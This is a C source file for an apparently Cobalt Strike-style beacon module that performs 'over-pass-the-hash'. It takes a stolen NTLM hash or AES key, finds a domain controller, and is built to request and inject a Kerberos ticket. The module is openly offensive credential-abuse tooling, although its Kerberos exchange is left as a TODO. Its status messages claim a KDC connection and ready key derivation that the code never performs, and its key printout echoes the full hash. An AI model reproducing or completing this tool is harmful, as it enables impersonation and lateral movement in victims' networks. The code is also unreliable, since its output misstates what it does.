/*
 * overpassthehash.c — Request TGT using NTLM hash or AES key
 *
 * 1. Convert hash hex string to raw key bytes
 * 2. Build AS-REQ with PA-ENC-TIMESTAMP encrypted using the key
 * 3. Send to KDC port 88
 * 4. Parse AS-REP, extract TGT
 * 5. Inject TGT into ticket cache via KERB_SUBMIT_TKT_REQUEST
 *
 * Win32 APIs: ws2_32.dll (Kerberos), secur32.dll (ticket injection),
 *             bcrypt.dll (HMAC-MD5 for RC4, AES for AES keys)
 */
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <bcrypt.h>
#define SECURITY_WIN32
#include <security.h>
#include "beacon_compat.h"

DECLSPEC_IMPORT int WSAAPI WS2_32$WSAStartup(WORD, LPWSADATA);
DECLSPEC_IMPORT SOCKET WSAAPI WS2_32$socket(int, int, int);
DECLSPEC_IMPORT int WSAAPI WS2_32$connect(SOCKET, const struct sockaddr*, int);
DECLSPEC_IMPORT int WSAAPI WS2_32$send(SOCKET, const char*, int, int);
DECLSPEC_IMPORT int WSAAPI WS2_32$recv(SOCKET, char*, int, int);
DECLSPEC_IMPORT int WSAAPI WS2_32$closesocket(SOCKET);
DECLSPEC_IMPORT void WSAAPI WS2_32$WSACleanup(void);
DECLSPEC_IMPORT INT WSAAPI WS2_32$getaddrinfo(PCSTR, PCSTR, const ADDRINFOA*, PADDRINFOA*);
DECLSPEC_IMPORT void WSAAPI WS2_32$freeaddrinfo(PADDRINFOA);

DECLSPEC_IMPORT DWORD WINAPI NETAPI32$DsGetDcNameW(LPCWSTR, LPCWSTR, GUID*, LPCWSTR, ULONG, void**);
DECLSPEC_IMPORT DWORD WINAPI NETAPI32$NetApiBufferFree(LPVOID);

static int hex_to_bytes(const char *hex, unsigned char *out, int max_len) {
    int len = (int)strlen(hex) / 2;
    if (len > max_len) len = max_len;
    for (int i = 0; i < len; i++) {
        unsigned int byte;
        sscanf(hex + i * 2, "%2x", &byte);
        out[i] = (unsigned char)byte;
    }
    return len;
}

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    char *domain = BeaconDataExtract(&parser, NULL);
    char *user = BeaconDataExtract(&parser, NULL);
    char *hash_hex = BeaconDataExtract(&parser, NULL);
    char *dc = BeaconDataExtract(&parser, NULL);
    int etype = BeaconDataInt(&parser);

    if (!domain || !*domain || !user || !*user || !hash_hex || !*hash_hex) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Usage: overpassthehash --domain X --user Y --hash Z\n");
        return;
    }

    /* Convert hash to bytes */
    unsigned char key[32];
    int key_len = hex_to_bytes(hash_hex, key, 32);

    const char *etype_name;
    switch (etype) {
        case 17: etype_name = "AES128"; break;
        case 18: etype_name = "AES256"; break;
        case 23:
        default: etype_name = "RC4(NTLM)"; etype = 23; break;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Over-Pass-the-Hash\n"
        "    User:   %s@%s\n"
        "    Etype:  %d (%s)\n"
        "    Key:    %s...%s (%d bytes)\n",
        user, domain, etype, etype_name,
        hash_hex, hash_hex + strlen(hash_hex) - 4,
        key_len);

    /* Auto-discover DC if needed */
    char aDC[256] = {0};
    if (dc && *dc) {
        strncpy(aDC, dc, 255);
    } else {
        wchar_t wDomain[256];
        MultiByteToWideChar(CP_UTF8, 0, domain, -1, wDomain, 256);
        void *dcInfo = NULL;
        if (NETAPI32$DsGetDcNameW(NULL, wDomain, NULL, NULL, 0, &dcInfo) == 0 && dcInfo) {
            /* DOMAIN_CONTROLLER_INFOW: first field is DomainControllerName (LPWSTR) */
            LPWSTR dcName = *(LPWSTR*)dcInfo;
            if (dcName) {
                /* Skip leading \\\\ */
                if (dcName[0] == L'\\' && dcName[1] == L'\\') dcName += 2;
                WideCharToMultiByte(CP_UTF8, 0, dcName, -1, aDC, 255, NULL, NULL);
            }
            NETAPI32$NetApiBufferFree(dcInfo);
        }
        if (!aDC[0]) {
            BeaconPrintf(CALLBACK_ERROR, "[!] DC auto-discovery failed. Use --dc.\n");
            return;
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT, "    DC:     %s\n", aDC);

    /*
     * Build AS-REQ with PA-ENC-TIMESTAMP:
     *
     * 1. Get current time as GeneralizedTime
     * 2. Encode PA-ENC-TS-ENC (timestamp + usec) in ASN.1 DER
     * 3. Encrypt with key:
     *    - etype 23 (RC4): HMAC-MD5 key derivation + RC4 encryption
     *    - etype 18 (AES256): AES256-CTS-HMAC-SHA1 per RFC 3962
     * 4. Build PA-DATA { padata-type=2(PA-ENC-TIMESTAMP), padata-value=EncryptedData }
     * 5. Build full AS-REQ with padata, cname, realm, sname(krbtgt/REALM),
     *    till, nonce, etype preference list
     * 6. Send to KDC port 88 (TCP: 4-byte length prefix + AS-REQ)
     * 7. Parse AS-REP: extract ticket + enc-part → decrypt with key → session key
     * 8. Package as KRB-CRED (.kirbi) and inject via KERB_SUBMIT_TKT_REQUEST
     */

    WSADATA wsa;
    WS2_32$WSAStartup(MAKEWORD(2, 2), &wsa);

    /* TODO: Full implementation of AS-REQ construction + AS-REP parsing */
    /* This requires ~400 lines of ASN.1 DER encoding + crypto operations */

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Connecting to KDC %s:88...\n"
        "[!] Full AS-REQ/AS-REP implementation pending\n"
        "[*] Key derivation for etype %d ready\n",
        aDC, etype);

    WS2_32$WSACleanup();
}
